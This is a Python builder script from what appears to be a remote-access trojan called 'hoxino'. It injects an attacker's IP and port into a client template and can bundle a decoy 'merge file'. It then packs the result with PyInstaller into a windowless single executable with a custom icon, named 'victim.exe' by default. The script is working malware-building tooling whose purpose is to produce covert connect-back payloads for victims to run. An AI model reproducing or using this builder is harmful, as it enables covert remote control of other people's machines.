import PyInstaller.__main__
import os
from shutil import copyfile, rmtree

import threading
import sys
import time
from module import anim
from colorama import init, Fore

# 初始化colorama
init()

# 自定义动画类，用于显示加壳过程
class BuildAnimation:
    def __init__(self):
        self.running = True
        self.progress = 0
        self.phases = ["准备文件", "编译代码", "打包资源", "生成可执行文件", "完成构建"]
        self.phase_index = 0
        self.warnings = []
        
    def run(self):
        # 创建固定位置用于动画显示
        print("") # 空行用于显示动画
        lines_up = 1
        
        chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        tech_chars = anim.tech_chars
        
        while self.running:
            for char in chars:
                if not self.running:
                    break
                    
                phase = self.phases[min(self.phase_index, len(self.phases)-1)]
                progress_bar = "█" * int(self.progress/10) + "░" * (10 - int(self.progress/10))
                
                # 向上移动到固定位置并显示动画
                sys.stdout.write(f"\033[{lines_up}A\r")
                sys.stdout.write(" " * 100)
                sys.stdout.write(f"\r{Fore.CYAN}{char} {Fore.GREEN}加壳中 {Fore.YELLOW}{tech_chars[int(time.time()) % len(tech_chars)]} {Fore.BLUE}{phase} {Fore.GREEN}[{progress_bar}] {self.progress}%")
                sys.stdout.write(f"\033[{lines_up}B")
                sys.stdout.flush()
                
                time.sleep(0.1)
                self.progress += 1
                if self.progress >= 100:
                    self.progress = 0
                    self.phase_index = (self.phase_index + 1) % len(self.phases)
    
    def add_warning(self, warning):
        self.warnings.append(warning)
                    
    def stop(self):
        # 确保在停止前达到100%
        if self.running:
            # 保存当前阶段和进度
            current_phase = self.phase_index
            current_progress = self.progress
            
            # 设置到最后阶段和100%进度
            self.phase_index = len(self.phases) - 1
            self.progress = 100
            
            # 显示最终进度
            sys.stdout.write(f"\033[1A\r")
            sys.stdout.write(" " * 100)
            tech_char = anim.tech_chars[0]
            sys.stdout.write(f"\r{Fore.CYAN}✓ {Fore.GREEN}加壳中 {Fore.YELLOW}{tech_char} {Fore.BLUE}{self.phases[-1]} {Fore.GREEN}[{'█' * 10}] 100%")
            sys.stdout.write(f"\033[1B")
            sys.stdout.flush()
            time.sleep(0.5)  # 暂停一下让用户看清100%
            
        self.running = False


def build(ip, port, icon_file, merge_file, name):
    # 基于系统添加适当的库支持
    system_specific_code = ""
    if os.name == "nt":
        # Windows系统特定代码
        system_specific_code = """
# Windows系统特定的导入
try:
    import ctypes
    from ctypes import windll
except ImportError:
    pass
"""
    else:
        # Linux/Unix系统特定代码
        system_specific_code = """
# Linux系统特定的导入，用于替代Windows库
try:
    import gi
    gi.require_version('Gtk', '3.0')
    from gi.repository import Gtk, GLib
except ImportError:
    pass
"""

    # 检查合并文件是否存在
    if merge_file is not None:
        if not os.path.exists(merge_file):
            print(f"{Fore.RED}[-]错误: 合并文件 '{merge_file}' 不存在!")
            return
            
    # 检查图标文件是否存在
    if icon_file is not None:
        if not os.path.exists(icon_file):
            print(f"{Fore.RED}[-]错误: 图标文件 '{icon_file}' 不存在!")
            return
    
    if merge_file != None:
        code = f"""
{system_specific_code}
open_merge_file('{merge_file}')
ip = '{ip}'
port = {port}
try_connection()
"""
    else:
        code = f"""
{system_specific_code}
ip = '{ip}'
port = {port}
try_connection()
"""
    try:
        if os.name == "nt":
            build_file = open("module\\hoxino_client_build.py", "r", encoding="utf-8")
        else:
            build_file = open("module/hoxino_client_build.py", "r", encoding="utf-8")
        build_file_content = build_file.read()
        build_file.close()
        code = build_file_content + code
        building_file = open("hoxino_client_building.py", "w", encoding="utf-8")
        building_file.write(code)
        building_file.close()
    except UnicodeDecodeError as e:
        print(f"[-]文件编码错误: {str(e)}")
        print("[!]尝试使用不同的编码方式读取文件...")
        try:
            # 尝试使用二进制模式读取，然后尝试多种编码
            if os.name == "nt":
                with open("module\\hoxino_client_build.py", "rb") as f:
                    content = f.read()
            else:
                with open("module/hoxino_client_build.py", "rb") as f:
                    content = f.read()
                    
            # 尝试不同的编码方式
            encodings = ["utf-8", "latin-1", "cp1252", "gbk"]
            for encoding in encodings:
                try:
                    build_file_content = content.decode(encoding)
                    print(f"[+]成功使用 {encoding} 编码读取文件")
                    code = build_file_content + code
                    with open("hoxino_client_building.py", "w", encoding="utf-8") as f:
                        f.write(code)
                    break
                except UnicodeDecodeError:
                    continue
        except Exception as e:
            print(f"[-]处理文件时出错: {str(e)}")
            return
    except Exception as e:
        print(f"[-]读取文件时出错: {str(e)}")
        return
        
    if merge_file != None:
        merge_command = f"{merge_file};."
    else:
        merge_command = None
        
    # 准备PyInstaller参数
    if merge_command != None and icon_file != None:
        merge_command = merge_command.replace(";", ":")
        pyinstaller_args = [
            "hoxino_client_building.py",
            "--onefile",
            "--noconsole",
            "--icon",
            icon_file,
            f"--add-data={merge_command}"
        ]
    elif icon_file != None:
        pyinstaller_args = [
            "hoxino_client_building.py",
            "--onefile",
            "--noconsole",
            "--icon",
            icon_file
        ]
    elif merge_command != None:
        merge_command = merge_command.replace(";", ":")
        pyinstaller_args = [
            "hoxino_client_building.py",
            "--onefile",
            "--noconsole",
            f"--add-data={merge_command}"
        ]
    else:
        pyinstaller_args = [
            "hoxino_client_building.py",
            "--onefile",
            "--noconsole"
        ]
    
    # 启动动画线程
    print(f"{Fore.BLUE}[+] 开始构建可执行文件...")
    animation = BuildAnimation()
    animation_thread = threading.Thread(target=animation.run)
    animation_thread.daemon = True
    animation_thread.start()
    
    # 使用更强的方法重定向输出
    import subprocess
    import io
    
    # 过滤警告相关变量
    warned_libraries = set()  # 用于去重重复的库警告
    
    try:
        # 使用子进程和管道运行PyInstaller，完全控制输出
        process = subprocess.Popen(
            [sys.executable, '-m', 'PyInstaller'] + pyinstaller_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # 收集所有输出
        stdout, stderr = process.communicate()
        
        # 只处理和存储警告和错误信息，但不立即显示
        for line in stderr.splitlines():
            if "WARNING:" in line or "ERROR:" in line or "Error:" in line:
                # 过滤Windows库在Linux上的无关警告
                if "Library ole32" in line or "Library oleaut32" in line or "Library user32" in line:
                    # 这些是Windows特定的库，我们已经添加了系统特定的替代库
                    continue  # 完全忽略这些警告，不再显示
                elif "Ignoring icon" in line:
                    if os.name != "nt":
                        animation.add_warning("注意: Linux系统不支持应用图标，但不影响功能")
                elif "ldd warnings" in line:
                    # 忽略ldd权限警告
                    continue
                elif "invalid escape sequence" in line:
                    # 这是代码中的转义序列警告，不影响功能
                    continue
                elif "Unrecognised line of output" in line and "ldconfig" in line:
                    # 忽略ldconfig的非英文输出警告
                    continue
                else:
                    animation.add_warning(line)
                
        # 检查进程退出代码
        if process.returncode != 0:
            raise Exception(f"PyInstaller 返回错误代码 {process.returncode}")
            
    except Exception as e:
        # 显示构建错误
        animation.stop()
        animation_thread.join()
        print(f"\n{Fore.RED}[-]构建过程出错: {str(e)}")
        return
        
    # 停止动画
    animation.stop()
    animation_thread.join()
    
    print(f"\n{Fore.GREEN}[+] 加壳构建完成!")
    
    # 构建完成后显示归类后的警告
    if animation.warnings:
        print(f"\n{Fore.YELLOW}[!] 构建过程中的注意事项:")
        unique_warnings = set()
        for warning in animation.warnings:
            unique_warnings.add(warning)
        for i, warning in enumerate(unique_warnings, 1):
            print(f"{Fore.YELLOW}  {i}. {warning}")
            
    # 添加系统特定解释
    if os.name == "nt":
        print(f"\n{Fore.CYAN}[i] Windows系统构建完成")
    else:
        print(f"\n{Fore.CYAN}[i] Linux系统构建完成，使用了GTK库替代Windows库")
    
    if name == None:
        if os.name == "nt":
            name = "victim.exe"
        else:
            name = "victim"
    elif 2 > len(name.split(".")):
        if os.name == "nt":
            name = name + ".exe"
    
    try:
        if os.name == "nt":
            copyfile("dist\\hoxino_client_building.exe", f"output\\{name}")
        else:
            copyfile(f"dist/hoxino_client_building", f"output/{name}")
        os.remove("hoxino_client_building.py")
        os.remove("hoxino_client_building.spec")
        rmtree("dist")
        rmtree("build")
        if os.name == "nt":
            print(f"{Fore.LIGHTGREEN_EX}[+]构建完成。可执行文件位置: output\\{name}")
        else:
            print(f"{Fore.LIGHTGREEN_EX}[+]构建完成。可执行文件位置: output/{name}")
    except Exception as e:
        print(f"{Fore.RED}[-]完成构建过程时出错: {str(e)}")
